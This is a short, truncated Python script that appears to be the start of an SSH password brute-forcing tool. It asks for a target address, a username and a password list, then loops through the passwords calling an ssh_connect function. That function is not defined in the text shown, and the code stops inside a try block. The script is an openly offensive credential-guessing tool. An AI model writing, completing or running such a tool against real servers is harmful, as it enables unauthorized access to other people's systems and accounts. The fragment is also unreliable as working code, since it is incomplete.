import sys
import os
import socket

import termcolor
import paramiko

host = input("[+] target addrress: ")
username = input("[+] SSH username: ")
input_file = input("[+] Passwords file: ")

if not os.path.exists(input_file):
    print(f"[!!] the file {input_file} does not exist")
    exit(1)

with open(input_file) as file:
    for line in file.readlines():
        password = line.strip()
        try:
            ssh_connect(password)
